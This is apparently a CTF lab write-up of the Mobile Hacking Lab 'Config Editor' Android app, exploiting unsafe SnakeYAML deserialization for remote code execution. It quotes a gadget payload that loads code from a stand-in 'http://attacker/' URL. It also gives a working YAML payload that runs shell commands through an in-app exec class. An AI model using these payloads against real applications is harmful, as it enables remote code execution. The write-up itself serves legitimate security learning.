---
title: "Lab - Config Editor: Write-up"
date: 2025-09-12
draft: false
description: "Write-up for Config Editor Lab from Mobile Hacking Lab"
drafet: false
categories: ["CTF"]
tags: ["MHL", "exploit", "command-injection", "deserialization","Android"]
---


## Introduction

Welcome to this write-up blog post. We will walk through my methodology to exploit a remote code execution (RCE) in the **Config Editor** challenge from Mobile Hacking Lab.

Our objective here is to document my process and help you understand how a third-party library can be exploited to execute arbitrary code remotely.

## Initial Analysis

I started by performing a basic triage on the `AndroidManifest.xml` file. This file is kind of a footprint of the application. It provides crucial information to the Android system and Google Play.

```xml
<uses-sdk android:minSdkVersion="26" android:targetSdkVersion="33"/>
```

This indicates that the device must be running Android 8.0 or newer versions.

```xml
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
```

Based on the context of the application being a config editor, those permissions seem to be normal.

```xml
android:networkSecurityConfig="@xml/network_security_config"

<network-security-config>
    <base-config cleartextTrafficPermitted="true"/>
</network-security-config>
```

By setting `cleartextTrafficPermitted="true"` in the base config, you re-enable HTTP traffic for your app unless you override it with more restrictive domain-specific rules. Search for other interesting stuff in the `strings.xml` file. We couldn't find anything interesting, so I jumped to read some code.

### MainActivity

So let’s start our analysis in the `MainActivity` class.

```xml
<activity
    android:name="com.mobilehackinglab.configeditor.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="file"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
        <data android:mimeType="application/yaml"/>
    </intent-filter>
</activity>
```

From the manifest file, we can see that the main activity is set to `exported="true"`, which enables us to use the `am`  command to start the activity. And it also handles `file`, `http`, and `https` URIs with the MIME type `application/yaml`.

Let’s install the app into our Android virtual machine (AVM).

- `adb install com.mobilehackinglab.configeditor.apk`

{{< figure
    src="imgs/img00.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

{{< figure
    src="imgs/img01.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

After installing the app and executing it, first it asks for permission to access media on the device.

The main window has 3 functionalities:

- **Load:** loads a `.YML` file, handled by the `loadYaml()` method
- **Save:** saves a `.YML` file, handled by the `saveYaml()` method
- **Text block:** used to edit/write a YAML config file

{{< figure
    src="imgs/img02.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

The `loadYaml()` method uses SnakeYAML, a popular Java library to parse YAML Ain’t Markup Language format (YAML) files. This is our vulnerable function. This library is known to be vulnerable to deserialization attacks when it processes untrusted input data.

```java
public final void loadYaml(Uri uri) throws FileNotFoundException {
    try {
        ParcelFileDescriptor parcelFileDescriptorOpenFileDescriptor = getContentResolver().openFileDescriptor(uri, "r");
        try {
            ParcelFileDescriptor parcelFileDescriptor = parcelFileDescriptorOpenFileDescriptor;
            FileInputStream inputStream = new FileInputStream(parcelFileDescriptor != null ? parcelFileDescriptor.getFileDescriptor() : null);
            DumperOptions dumper = new DumperOptions();
            dumper.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);
            dumper.setIndent(2);
            dumper.setPrettyFlow(true);
            Yaml yaml = new Yaml(dumper);
            Object deserializedData = yaml.load(inputStream); // << vulnerable
            String serializedData = yaml.dump(deserializedData);
            ActivityMainBinding activityMainBinding = this.binding;
            if (activityMainBinding == null) {
                Intrinsics.throwUninitializedPropertyAccessException("binding");
                activityMainBinding = null;
            }
            activityMainBinding.contentArea.setText(serializedData);
            Unit unit = Unit.INSTANCE;
            CloseableKt.closeFinally(parcelFileDescriptorOpenFileDescriptor, null);
        } finally {
        }
    } catch (Exception e) {
        Log.e(TAG, "Error loading YAML: " + uri, e);
    }
}
```

## Deserialization Attacks

[Deserialization attacks](https://cwe.mitre.org/data/definitions/502.html) happen when an application **accepts serialized data from an untrusted source** and deserializes it without proper validation or sanitization.

Making a quick Google search, I stumble upon this blog post from [Veracode](https://www.veracode.com/blog/resolving-cve-2022-1471-snakeyaml-20-release-0/). In this blog post, they explain a bit more in detail about this type of vulnerability and reference other interesting sources.

Below, we can see the call flow for processing the data stream.

```java
// MainActiviy.java

Object deserializedData = yaml.load(inputStream);
```

```java
// Yaml.java

public <T> T load(String str) {
    return (T) loadFromReader(new StreamReader(str), Object.class);
}
```

```java
// StreamReader.java

import java.io.StringReader;

public StreamReader(String stream) {
    this(new StringReader(stream));
    this.name = "'string'";
}
```

In the Veracode blog, they mentioned:

> *SnakeYAML prior to 2.0 did not restrict the type of an object after deserialization, which lets an attacker run arbitrary code if they have control of the YAML document. The `Constructor` method does not limit which classes can be instantiated during deserialization, in fact, any class in the Java classpath is available. A design choice was made to not restrict global tags to fully support the 1.1 specs, but as a result it allows an attacker to specify arbitrary tags in the YAML document which then get converted into Java “gadgets”.*
>

With that in mind and after finishing reading the blog, I understand that I need to find a gadget that is a *class* or *function* available within the execution scope of an application.

One of the payload examples in the blog is:

```yaml
!!javax.script.ScriptEngineManager [  
     !!java.net.URLClassLoader [[  
          !!java.net.URL ["http://attacker/"]  
     ]]  
]
```

So I thought to myself, “Great, now I just need to run a Python server and perform a request. Easy.”

I was wrong! The problem with that payload is that the `javax.script.ScriptEngineManager` class is not directly available in the standard Android SDK. So I need to find another gadget to exploit this application. That is when something called my attention!

In the package `com.mobilehackinglab.configeditor`, there is a class named `LegacyCommandUtil` with an error message `Command Util is unsafe and should not be used`. Below we can see the class code.

```java
public final class LegacyCommandUtil {
    public LegacyCommandUtil(String command) throws IOException {
        Intrinsics.checkNotNullParameter(command, "command");
        Runtime.getRuntime().exec(command);
    }
}
```

These will be our gadgets to achieve remote code execution. Now, we just need to create a custom payload.

## Pwning

With this crafted YAML payload file, we achieve remote code execution, and for just a PoC, we create a `.txt` file with the `touch` command.

```yaml
!!com.mobilehackinglab.configeditor.LegacyCommandUtil
  ["touch /data/data/com.mobilehackinglab.configeditor/files/pwned_app.txt"]

```

{{< figure
    src="imgs/img03.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

## Conclusion

With this challenge, we learn how a seemingly benign feature can become a critical vulnerability when unsafe deserialization is involved. By leveraging SnakeYAML’s unrestricted type construction and identifying a convenient in-app gadget (`LegacyCommandUtil`), we turned a simple file import into reliable RCE.

If you find any misunderstanding, feel free to reach out to me :).
